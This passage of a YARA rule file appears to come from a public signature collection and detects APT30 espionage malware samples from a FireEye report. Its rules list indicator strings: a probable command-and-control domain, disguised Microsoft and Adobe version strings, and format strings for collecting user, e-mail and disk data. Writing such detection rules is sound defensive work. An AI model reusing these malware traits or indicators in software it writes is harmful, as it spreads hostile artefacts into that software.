filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_7\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: 74b87086887e0c67ffb035069b195ac7)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Sample_7\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"datain\" fullword ascii\n        $s3 = \"C:\\\\Prog\" ascii\n        $s4 = \"$LDDATA$\" ascii\n        $s5 = \"Maybe a Encrypted Flash\" fullword ascii\n        $s6 = \"Jean-loup Gailly\" ascii\n        $s8 = \"deflate 1.1.3 Copyright\" ascii\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Generic_E\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: 8ff473bedbcc77df2c49a91167b1abeb)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Generic_E\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"Nkfvtyvn}\" ascii\n        $s6 = \"----------------g_nAV=%d,hWnd:0x%X,className:%s,Title:%s,(%d,%d,%d,%d),BOOL=%d\" fullword ascii\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_8\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: 44b98f22155f420af4528d17bb4a5ec8)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Sample_8\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"ateProcessA\" ascii\n        $s1 = \"Ternel32.dllFQ\" fullword ascii\n        $s2 = \"StartupInfoAModuleHand\" fullword ascii\n        $s3 = \"OpenMutex\" fullword ascii\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Generic_B\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: 29395c528693b69233c1c12bef8a64b3)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Generic_B\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s2 = \"Moziea/4.0\" ascii\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Generic_I\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: fe211c7a081c1dac46e3935f7c614549)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Generic_I\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"Copyright 2012 Google Inc. All rights reserved.\" fullword wide\n        $s1 = \"(Prxy%c-%s:%u)\" fullword ascii\n        $s2 = \"Google Inc.\" fullword wide\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_9\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: e3ae3cbc024e39121c87d73e87bb2210)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Sample_9\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"\\\\Windo\" ascii\n        $s2 = \"oHHOSTR\" ascii\n        $s3 = \"Softwa]\\\\Mic\" ascii\n        $s4 = \"Startup'T\" ascii\n        $s6 = \"Ora\\\\%^\" ascii\n        $s7 = \"\\\\Ohttp=r\" ascii\n        $s17 = \"help32Snapshot0L\" ascii\n        $s18 = \"TimUmoveH\" ascii\n        $s20 = \"WideChc[lobalAl\" ascii\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_10\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: 8c713117af4ca6bbd69292a78069e75b)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Sample_10\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"Version 4.7.3001\" fullword wide\n        $s1 = \"Copyright (c) Microsoft Corporation 2004\" fullword wide\n        $s2 = \"Microsoft(R) is a registered trademark of Microsoft Corporation in the U\" wide\n        $s3 = \"!! Use Connect Method !!\" fullword ascii\n        $s4 = \"(Prxy%c-%s:%u)\" fullword ascii\n        $s5 = \"msmsgs\" fullword wide\n        $s18 = \"(Prxy-No)\" fullword ascii\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_11\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: d97aace631d6f089595f5ce177f54a39)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Sample_11\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"System\\\\CurrentControlSet\\\\control\\\\ComputerName\\\\ComputerName\" fullword ascii\n        $s1 = \"msofscan.exe\" fullword wide\n        $s2 = \"Mozilla/4.0 (compatible; MSIE 5.0; Win32)\" fullword ascii\n        $s3 = \"Microsoft? is a registered trademark of Microsoft Corporation.\" fullword wide\n        $s4 = \"Windows XP Professional x64 Edition or Windows Server 2003\" fullword ascii\n        $s9 = \"NetEagle_Scout - \" fullword ascii\n        $s10 = \"Server 4.0, Enterprise Edition\" fullword ascii\n        $s11 = \"Windows 3.1(Win32s)\" fullword ascii\n        $s12 = \"%s%s%s %s\" fullword ascii\n        $s13 = \"Server 4.0\" fullword ascii\n        $s15 = \"Windows Millennium Edition\" fullword ascii\n        $s16 = \"msofscan\" fullword wide\n        $s17 = \"Eagle-Norton360-OfficeScan\" fullword ascii\n        $s18 = \"Workstation 4.0\" fullword ascii\n        $s19 = \"2003 Microsoft Office system\" fullword wide\n\n    condition:\n        filesize < 250KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_12\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: c95cd106c1fecbd500f4b97566d8dc96)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Sample_12\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"Richic\" fullword ascii\n        $s1 = \"Accept: image/gif, */*\" fullword ascii\n        $s2 = \"----------------g_nAV=%d,hWnd:0x%X,className:%s,Title:%s,(%d,%d,%d,%d),BOOL=%d\" fullword ascii\n\n    condition:\n        filesize < 250KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_13\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: 95bb314fe8fdbe4df31a6d23b0d378bc)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Sample_13\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"msofscan.exe\" fullword wide\n        $s1 = \"Microsoft? is a registered trademark of Microsoft Corporation.\" fullword wide\n        $s2 = \"Microsoft Office Word Plugin Scan\" fullword wide\n        $s3 = \"? 2006 Microsoft Corporation.  All rights reserved.\" fullword wide\n        $s4 = \"msofscan\" fullword wide\n        $s6 = \"2003 Microsoft Office system\" fullword wide\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_14\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: 6f931c15789d234881be8ae8ccfe33f4)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Sample_14\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"AdobeReader.exe\" fullword wide\n        $s1 = \"yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy\" fullword ascii\n        $s4 = \"10.1.7.27\" fullword wide\n        $s5 = \"Copyright 1984-2012 Adobe Systems Incorporated and its licensors. All ri\" wide\n        $s8 = \"Adobe Reader\" fullword wide\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_15\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: e26a2afaaddfb09d9ede505c6f1cc4e3)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Sample_15\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"\\\\Windo\" ascii\n        $s2 = \"HHOSTR\" ascii\n        $s3 = \"Softwa]\\\\Mic\" ascii\n        $s4 = \"Startup'T\" fullword ascii\n        $s17 = \"help32Snapshot0L\" fullword ascii\n        $s18 = \"TimUmoveH\" ascii\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_16\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: 37e568bed4ae057e548439dc811b4d3a)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Sample_16\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"\\\\Temp1020.txt\" fullword ascii\n        $s1 = \"cmcbqyjs\" fullword ascii\n        $s2 = \"SPVSWh\\\\\" fullword ascii\n        $s4 = \"PSShxw@\" fullword ascii\n        $s5 = \"VWhHw@\" fullword ascii\n        $s7 = \"SVWhHw@\" fullword ascii\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Generic_A\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: af1c1c5d8031c4942630b6a10270d8f4)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Generic_A\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s5 = \"WPVWhhiA\" fullword ascii\n        $s6 = \"VPWVhhiA\" fullword ascii\n        $s11 = \"VPhhiA\" fullword ascii\n        $s12 = \"uUhXiA\" fullword ascii\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_17\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: 23813c5bf6a7af322b40bd2fd94bd42e)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Sample_17\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Nkfvtyvn}]ty}ztU\" fullword ascii\n        $s4 = \"IEXPL0RE\" fullword ascii\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_18\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: b2138a57f723326eda5a26d2dec56851)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Sample_18\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"w.km-nyc.com\" fullword ascii\n        $s1 = \"tscv.exe\" fullword ascii\n        $s2 = \"Exit/app.htm\" ascii\n        $s3 = \"UBD:\\\\D\" ascii\n        $s4 = \"LastError\" ascii\n        $s5 = \"MicrosoftHaveAck\" ascii\n        $s7 = \"HHOSTR\" ascii\n        $s20 = \"XPL0RE.\" ascii\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Generic_G\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: 53f1358cbc298da96ec56e9a08851b4b)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Generic_G\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"%s\\\\%s\\\\%s=%s\" fullword ascii\n        $s1 = \"Copy File %s OK!\" fullword ascii\n        $s2 = \"%s Space:%uM,FreeSpace:%uM\" fullword ascii\n        $s4 = \"open=%s\" fullword ascii\n        $s5 = \"Maybe a Encrypted Flash Disk\" fullword ascii\n        $s12 = \"%04u-%02u-%02u %02u:%02u:%02u\" fullword ascii\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_19\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: 5d4f2871fd1818527ebd65b0ff930a77)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Sample_19\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"C:\\\\Program Files\\\\Common Files\\\\System\\\\wab32\" fullword ascii\n        $s1 = \"%s,Volume:%s,Type:%s,TotalSize:%uMB,FreeSize:%uMB\" fullword ascii\n        $s2 = \"\\\\TEMP\\\\\" fullword ascii\n        $s3 = \"\\\\Temporary Internet Files\\\\\" fullword ascii\n        $s5 = \"%s TotalSize:%u Bytes\" fullword ascii\n        $s6 = \"This Disk Maybe a Encrypted Flash Disk!\" fullword ascii\n        $s7 = \"User:%-32s\" fullword ascii\n        $s8 = \"\\\\Desktop\\\\\" fullword ascii\n        $s9 = \"%s.%u_%u\" fullword ascii\n        $s10 = \"Nick:%-32s\" fullword ascii\n        $s11 = \"E-mail:%-32s\" fullword ascii\n        $s13 = \"%04u-%02u-%02u %02u:%02u:%02u\" fullword ascii\n        $s14 = \"Type:%-8s\" fullword ascii\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and 8 of them\n}\n\nrule APT30_Generic_E_v2\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: 71f25831681c19ea17b2f2a84a41bbfb)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Generic_E_v2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"Nkfvtyvn}duf_Z}{Ys\" fullword ascii\n        $s1 = \"Nkfvtyvn}*Zrswru1i\" fullword ascii\n        $s2 = \"Nkfvtyvn}duf_Z}{V\" fullword ascii\n        $s3 = \"Nkfvtyvn}*ZrswrumT\\\\b\" fullword ascii\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_20\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: 5ae51243647b7d03a5cb20dccbc0d561)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Sample_20\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"dizhi.gif\" fullword ascii\n        $s2 = \"Mozilla/u\" ascii\n        $s3 = \"XicrosoftHaveAck\" ascii\n        $s4 = \"flyeagles\" ascii\n        $s10 = \"iexplore.\" ascii\n        $s13 = \"WindowsGV\" fullword ascii\n        $s16 = \"CatePipe\" fullword ascii\n        $s17 = \"'QWERTY:/webpage3\" fullword ascii\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_21\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: 78c4fcee5b7fdbabf3b9941225d95166)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Sample_21\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"Service.dll\" fullword ascii\n        $s1 = \"(%s:%s %s)\" fullword ascii\n        $s2 = \"%s \\\"%s\\\",%s %s\" fullword ascii\n        $s5 = \"Proxy-%s:%u\" fullword ascii\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_22\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: fad06d7b4450c4631302264486611ec3)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Sample_22\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"(\\\\TEMP\" fullword ascii\n        $s2 = \"Windows\\\\Cur\" fullword ascii\n        $s3 = \"LSSAS.exeJ\" fullword ascii\n        $s4 = \"QC:\\\\WINDOWS\" fullword ascii\n        $s5 = \"System Volume\" fullword ascii\n        $s8 = \"PROGRAM FILE\" fullword ascii\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Generic_F\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: 4c10a1efed25b828e4785d9526507fbc)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Generic_F\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"\\\\~zlzl.exe\" fullword ascii\n        $s2 = \"\\\\Internet Exp1orer\" fullword ascii\n        $s3 = \"NodAndKabIsExcellent\" fullword ascii\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_23\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: a5ca2c5b4d8c0c1bc93570ed13dcab1a)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Sample_23\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"hostid\" ascii\n        $s1 = \"\\\\Window\" ascii\n        $s2 = \"%u:%u%s\" fullword ascii\n        $s5 = \"S2tware\\\\Mic\" ascii\n        $s6 = \"la/4.0 (compa\" ascii\n        $s7 = \"NameACKernel\" fullword ascii\n        $s12 = \"ToWideChc[lo\" fullword ascii\n        $s14 = \"help32SnapshotfL\" ascii\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_24\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: 062fe1336459a851bd0ea271bb2afe35)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Sample_24\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"dizhi.gif\" fullword ascii\n        $s3 = \"Mozilla/4.0\" fullword ascii\n        $s4 = \"lyeagles\" fullword ascii\n        $s6 = \"HHOSTR\" ascii\n        $s7 = \"#MicrosoftHaveAck7\" ascii\n        $s8 = \"iexplore.\" fullword ascii\n        $s17 = \"ModuleH\" fullword ascii\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_25\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: c4c068200ad8033a0f0cf28507b51842)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Sample_25\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"C:\\\\WINDOWS\" fullword ascii\n        $s2 = \"aragua\" fullword ascii\n        $s4 = \"\\\\driver32\\\\7$\" fullword ascii\n        $s8 = \"System V\" fullword ascii\n        $s9 = \"Compu~r\" fullword ascii\n        $s10 = \"PROGRAM L\" fullword ascii\n        $s18 = \"GPRTMAX\" fullword ascii\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_26\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: 428fc53c84e921ac518e54a5d055f54a)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Sample_26\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"forcegue\" fullword ascii\n        $s3 = \"Windows\\\\Cur\" fullword ascii\n        $s4 = \"System Id\" fullword ascii\n        $s5 = \"Software\\\\Mic\" fullword ascii\n        $s6 = \"utiBy0ToWideCh&$a\" fullword ascii\n        $s10 = \"ModuleH\" fullword ascii\n        $s15 = \"PeekNamed6G\" fullword ascii\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Generic_D\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: 597805832d45d522c4882f21db800ecf)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Generic_D\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"Windows Security Service Feedback\" fullword wide\n        $s1 = \"wssfmgr.exe\" fullword wide\n        $s2 = \"\\\\rb.htm\" fullword ascii\n        $s3 = \"rb.htm\" fullword ascii\n        $s4 = \"cook5\" ascii\n        $s5 = \"5, 4, 2600, 0\" fullword wide\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_27\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: d38e02eac7e3b299b46ff2607dd0f288)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Sample_27\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"Mozilla/4.0\" fullword ascii\n        $s1 = 